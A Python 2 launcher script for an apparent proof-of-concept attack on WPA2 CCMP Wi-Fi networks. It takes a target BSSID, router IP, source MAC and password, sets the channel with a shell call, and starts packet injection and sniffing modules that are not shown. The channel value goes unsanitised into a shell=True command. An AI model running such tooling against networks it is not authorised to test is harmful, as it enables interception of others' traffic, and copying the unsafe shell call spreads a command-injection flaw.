#! /usr/bin/python2
import argparse
import sys
import subprocess
import signal
from lib.packets import Handler
from lib.sniffer import Sniffer

def channelSet(nic, chan):
    """Set the channel for a given NIC"""
    subprocess.call('iwconfig %s channel %s' % (nic, chan), shell=True)


def crtlC(args):
    """Handle CTRL+C."""
    def tmp(signal, frame):
        print('[!] Crtl + C')
        sys.exit(0)
    return tmp


def main(args):
    """Launching logic"""

    ## Lowercase BSSID
    args.bssid = args.bssid.lower()

    args.inj = 'mon'
    args.mon = 'mon'

    ## Set channel if so desired
    if args.channel is not None:
        print('[+] Setting NIC Channel to {0}'.format(args.channel))
        channelSet(args.i, args.channel)

    ## Launch the handler
    etl = Handler(args)

    ## Begin sniffing
    snif = Sniffer(etl, args)
    snif.threaded_sniff(args)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'ncsi weakness on 802.11 WPA2 CCMP network - proof of concept')
    parser.add_argument('-i',
                        metavar = '<interface>',
                        help = 'Your injection interface')
    parser.add_argument('--bssid',
                        metavar = '<tgt BSSID>',
                        help = 'Target BSSID')
    parser.add_argument('--channel',
                        metavar = '<channel>',
                        help = 'Set the channel for the NICs')
    parser.add_argument('--essid',
                        metavar = '<tgt ESSID>',
                        help = 'Target ESSID')
    parser.add_argument('--rtrip',
                        metavar = '<router ip>',
                        help = 'Router IP ~~ req!')
    parser.add_argument('--srcmac',
                         metavar = '<source mac>',
                         help = 'Source MAC ~~ req!')
    parser.add_argument('--wpa',
                        metavar = '<wpa password>',
                        help = 'Password for WPA')
    args = parser.parse_args()

    ## Crtl + C handling
    signal_handler = crtlC(args)
    signal.signal(signal.SIGINT, signal_handler)

    ## Launch
    main(args)
